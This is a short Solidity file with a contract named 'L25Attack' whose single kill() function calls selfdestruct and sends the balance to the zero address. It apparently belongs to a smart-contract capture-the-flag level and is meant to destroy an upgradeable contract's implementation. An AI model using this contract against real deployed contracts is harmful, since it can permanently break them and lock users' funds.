// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract L25Attack {
    function kill() external {
        selfdestruct(payable(address(0)));
    }
}
